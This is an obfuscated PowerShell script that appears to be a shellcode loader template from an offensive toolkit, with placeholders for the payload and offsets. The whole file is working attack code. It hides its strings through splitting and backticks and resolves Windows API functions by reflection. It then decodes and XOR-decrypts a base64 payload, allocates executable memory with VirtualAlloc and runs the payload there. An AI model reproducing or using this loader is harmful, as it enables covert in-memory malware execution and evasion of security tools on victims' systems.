S`Et-`StrI`ctmodE -Version 2

function fuNC_`G`et_pROc_a`d`dr`ess {
	Param (${VA`R_`m`OdulE}, ${var_`p`ROceDuRe})		
	${vAR_Un`SaFe`_NatIVE`_mE`T`HoDS} = ([AppDomain]::"cUrREn`T`do`MaIN".("{1}{2}{0}" -f'blies','Get','Assem').Invoke() | Wh`eRE-O`BJE`cT { ${_}."GloB`ALa`S`se`MBLycAC`hE" -And ${_}."LoCa`T`iOn".("{0}{1}"-f 'Sp','lit').Invoke('\\')[-1].("{2}{1}{0}" -f's','ual','Eq').Invoke(("{2}{0}{1}" -f 'ystem.d','ll','S')) }).("{0}{1}{2}"-f'Ge','tTyp','e').Invoke(("{6}{3}{2}{4}{5}{1}{7}{0}"-f 'thods','eNativeM','Win32.U','crosoft.','nsa','f','Mi','e'))
	${Va`R_G`pa} = ${VaR_uN`SAFE_NAtiVe_m`E`TH`ODS}.("{1}{2}{0}" -f 'ethod','G','etM').Invoke(("{1}{3}{4}{0}{2}" -f'es','GetProc','s','Add','r'), [Type[]] @(("{3}{8}{5}{0}{7}{6}{4}{2}{1}" -f 'me.In','eRef','Handl','S','ces.','m.Runti','ropServi','te','yste'), ("{1}{0}"-f'tring','s')))
	return ${v`AR_g`pA}."iN`VOKe"(${n`ULl}, @([System.Runtime.InteropServices.HandleRef](NE`w-`ObjeCt ('S'+'yst'+'em.Runtime'+'.Inte'+'ro'+'p'+'Services.HandleRef')((nE`W-Ob`jecT ('IntPt'+'r')), (${VAr_`UnSa`FE_`Native_`meT`hOds}.("{0}{1}{2}" -f'Ge','tMetho','d').Invoke(("{0}{3}{1}{2}" -f'GetModu','n','dle','leHa')))."I`NVokE"(${N`ULL}, @(${v`Ar_MO`Dule})))), ${VaR_`pRo`ced`URE}))
}

function f`U`Nc_g`eT_DElEG`Ate_`T`yPE {
	Param (
		[Parameter(poSiTion = 0, manDaTORY = ${T`RUe})] [Type[]] ${V`AR`_PAR`AmETerS},
		[Parameter(POSitIon = 1)] [Type] ${vAR_r`eT`U`Rn`_t`ype} = [Void]
	)

	${vAR`_tyPE_buI`Ld`ER} = [AppDomain]::"C`URReNt`doMAin".("{3}{2}{4}{1}{0}{5}{6}"-f'e','micAss','neDy','Defi','na','m','bly').Invoke((NeW`-ObJe`Ct ('Sy'+'s'+'te'+'m.Ref'+'lection.'+'Asse'+'mblyNa'+'me')(("{0}{4}{1}{2}{3}" -f 'Reflect','ele','gat','e','edD'))), [System.Reflection.Emit.AssemblyBuilderAccess]::"R`UN").("{0}{1}{3}{2}{4}" -f 'D','efine','namicMo','Dy','dule').Invoke(("{0}{4}{1}{3}{2}"-f'I','d','le','u','nMemoryMo'), ${fA`Lse}).("{2}{1}{0}" -f 'e','neTyp','Defi').Invoke(("{3}{0}{1}{2}"-f 'legate','Ty','pe','MyDe'), ("{6}{10}{3}{5}{9}{0}{1}{11}{7}{2}{8}{4}"-f',',' Sealed, ',' ','bl','ss','i','Class, ','siClass,','AutoCla','c','Pu','An'), [System.MulticastDelegate])
	${VAR_`T`ype`_B`U`iLder}.("{2}{0}{1}{3}" -f 'ef','ineConstruc','D','tor').Invoke(("{6}{9}{8}{2}{5}{0}{4}{3}{1}{7}" -f 'ig','bli',', Hid','u',', P','eByS','RTSpeci','c','Name','al'), [System.Reflection.CallingConventions]::"Stan`da`Rd", ${VAr_PaR`A`me`T`ers}).("{6}{1}{0}{3}{2}{5}{4}"-f 'eme','Impl','ionF','ntat','s','lag','Set').Invoke(("{2}{1}{4}{0}{3}"-f 'ge','time, ','Run','d','Mana'))
	${V`Ar_`Type_b`UIlD`er}.("{2}{0}{3}{1}"-f'neMe','d','Defi','tho').Invoke('Invoke', ("{4}{1}{2}{3}{0}{6}{8}{5}{7}" -f'Ne','c, HideBySi','g,',' ','Publi','t,','w',' Virtual','Slo'), ${vA`R_`ReTURN_`TYPe}, ${VaR_`pa`RaMeT`e`Rs}).("{1}{2}{5}{0}{3}{4}{6}"-f 'm','S','et','entati','onFla','Imple','gs').Invoke(("{0}{1}{2}{3}"-f 'Ru','ntime,',' Manag','ed'))

	return ${v`AR_`T`ype_BuIldEr}.("{1}{2}{0}"-f'e','Crea','teTyp').Invoke()
}

If ([IntPtr]::"sI`Ze" -eq 8) {
	[Byte[]]${Va`R`_CODE} = [System.Convert]::("{0}{2}{1}"-f'FromBase6','tring','4S').Invoke('%%DATA%%')

	for (${x} = 0; ${X} -lt ${V`AR`_COde}."c`ouNt"; ${x}++) {
		${var`_cOde}[${X}] = ${VA`R_cO`dE}[${X}] -bxor 42
	}

	[Byte[]]${F`U`Nc_gmh} = [BitConverter]::("{1}{0}"-f 'etBytes','G').Invoke((F`UNC`_G`eT_p`ROC_a`Dd`REsS ('kernel'+'32') ('Ge'+'tM'+'odu'+'leHandleA')).("{1}{2}{0}"-f't64','ToI','n').Invoke())
	[Byte[]]${Fun`C_`g`pA} = [BitConverter]::("{1}{0}"-f 'tes','GetBy').Invoke((fun`C_GET_PRoC`_`A`ddr`E`sS ('ke'+'rn'+'el32') ('GetPr'+'oc'+'Add'+'re'+'ss')).("{1}{0}"-f'oInt64','T').Invoke())
	[Array]::("{0}{1}"-f 'Cop','y').Invoke(${F`Unc_Gmh}, 0, ${Va`R`_CoDE}, %%GMH_OFFSET%%, ${f`UN`C_GMH}."le`NgTh")
	[Array]::("{1}{0}" -f'opy','C').Invoke(${fu`NC`_Gpa}, 0, ${var`_`CodE}, %%GPA_OFFSET%%, ${FUn`C_GPa}."lenG`Th")

	${v`Ar_va} = [System.Runtime.InteropServices.Marshal]::("{2}{0}{1}{4}{3}" -f'Functi','o','GetDelegateFor','inter','nPo').Invoke((f`U`NC_`G`Et`_PRoC`_adDRESS ('k'+'er'+'nel32.dll') ('V'+'irtua'+'lAllo'+'c')), (fUNc_gEt_`deL`eG`A`Te_`Type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
	${vAr_bU`FF`eR} = ${v`AR_Va}."iN`VOKe"([IntPtr]::"Ze`Ro", ${va`R_c`ODE}."L`E`NgtH", 0x3000, 0x40)
	[System.Runtime.InteropServices.Marshal]::("{0}{1}"-f 'Cop','y').Invoke(${v`Ar_C`ode}, 0, ${vaR`_BU`FFEr}, ${vaR_c`O`DE}."lE`NG`TH")

	${Va`R_`RunMe} = [System.Runtime.InteropServices.Marshal]::"gE`TDele`g`A`TEf`orF`UNCTIOnP`oiNtEr"(${v`Ar_`Bu`FfeR}, (fu`NC_GeT`_DeleGaT`e_t`ypE @([IntPtr]) ([Void])))
	${v`AR`_rUnmE}."iNv`OKe"([IntPtr]::"ZE`Ro")
}

